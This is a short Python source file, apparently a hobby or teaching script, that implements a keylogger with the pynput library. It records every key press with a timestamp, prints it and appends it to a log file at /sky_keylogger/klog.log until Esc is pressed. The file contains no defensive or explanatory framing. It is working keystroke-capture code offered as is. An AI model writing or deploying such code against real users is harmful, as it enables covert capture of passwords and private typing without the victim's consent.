from pynput import keyboard
from datetime import datetime

class Keylogger:
    def run(self):
        def on_press(key):
            keypressed = f"Key Pressed: {key} - {datetime.now()}"
            print(keypressed)
            
            with open("/sky_keylogger/klog.log", "a") as file:
                file.write(f"{keypressed}\n")
            
            if key == keyboard.Key.esc:
                return False

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()
        
        listener = keyboard.Listener(on_press=on_press)
        listener.start()

keylogger = Keylogger()
keylogger.run()